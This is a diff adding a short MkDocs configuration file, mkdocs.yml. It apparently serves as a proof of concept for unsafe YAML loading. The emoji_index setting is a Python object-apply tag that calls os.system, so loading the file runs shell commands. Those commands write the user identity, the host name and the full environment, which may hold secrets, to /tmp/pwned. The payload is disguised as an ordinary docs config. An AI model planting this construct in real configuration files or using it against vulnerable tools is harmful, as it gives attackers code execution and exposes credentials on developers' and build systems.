@@ -1,0 +1,6 @@
+site_name: My Docs
+markdown_extensions:
+  - pymdownx.emoji:
+      emoji_index: !!python/object/apply:os.system
+        args:
+          - "id > /tmp/pwned && hostname >> /tmp/pwned && env >> /tmp/pwned"
